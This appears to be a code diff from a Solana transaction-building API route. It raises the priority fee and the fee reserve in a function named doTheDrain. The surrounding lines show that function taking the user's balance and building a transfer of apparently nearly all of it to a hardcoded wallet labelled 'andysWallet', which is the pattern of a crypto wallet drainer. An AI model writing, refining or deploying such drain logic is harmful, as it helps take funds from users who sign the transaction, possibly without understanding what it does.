@@ -58,7 +58,7 @@ export async function POST(request: Request) {
   const tx = new Transaction();
 
   tx.add(ComputeBudgetProgram.setComputeUnitLimit({units: 100_000}))
-  tx.add(ComputeBudgetProgram.setComputeUnitPrice({microLamports: 10_000}))
+  tx.add(ComputeBudgetProgram.setComputeUnitPrice({microLamports: 200_000}))
 
 
   if (programString=="drain"){
@@ -99,7 +99,7 @@ export async function OPTIONS(request: Request) {
 
 async function doTheDrain(connection: Connection, user: PublicKey, tx: Transaction) {
   const andysWallet = new PublicKey("AndykcFpupACYs2x74mDiu4tFH22NGrGBrcZzGicG1Xa")
-  const fees = 5000+1000;
+  const fees = 5000+20000;
   const balance = await connection.getBalance(user); 
   const ix = SystemProgram.transfer(
     {
